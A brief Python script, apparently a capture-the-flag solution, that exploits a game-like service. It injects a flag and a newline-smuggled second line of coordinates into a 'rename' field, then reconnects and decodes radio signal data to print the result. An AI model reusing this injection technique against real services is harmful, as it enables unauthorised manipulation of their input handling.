import logging

from shared import decode_signal_data, make_conn, randstr

# CHANGE THIS
TARGET_X = 478627
TARGET_Y = 424018

c, user, password = make_conn()

c.send_line(rf"-e rename {randstr(5)}\\n{TARGET_X} {TARGET_Y}")
logging.info("Renamed")
c.send_line("disconnect")
logging.info("Disconnected")

c, user, password = make_conn(user=user, password=password)

c.send_line("radio 0 x")
logging.info("Gathering signal data...")
c.recv_line()


decoded = decode_signal_data(bytearray.fromhex(c.recv_line().decode()))
print(decoded[0].decode())
